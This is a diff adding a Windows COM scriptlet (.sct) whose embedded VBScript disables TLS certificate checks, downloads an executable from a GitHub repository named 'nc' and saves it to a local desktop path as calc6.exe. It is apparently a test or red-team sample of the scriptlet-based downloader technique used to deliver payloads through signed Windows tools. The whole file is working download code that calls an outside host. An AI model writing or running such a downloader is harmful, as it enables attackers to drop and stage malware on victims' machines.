@@ -1,0 +1,22 @@
+<?XML version="1.0"?>
+<scriptlet>
+	<registration progid="Lwj8h8Cd" classid="{d27b2c13-7e63-b507-eaf0-b4fb4df40559}">
+		<script>
+			<![CDATA[ 
+				Const adTypeBinary = 1
+				Const adSaveCreateOverWrite = 2
+				Dim http,ado
+				Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
+				http.SetOption 2, 13056
+				http.open "GET","https://github.com/HoldOnToYourHeart/nc/raw/master/calc.exe",False
+				http.send
+				Set ado = createobject("Adodb.Stream")
+				ado.Type = adTypeBinary
+				ado.Open
+				ado.Write http.responseBody
+				ado.SaveToFile "C:\Users\31030\Desktop\tools\test\calc6.exe"
+				ado.Close
+				]]>
+		</script>
+	</registration> 
+</scriptlet>
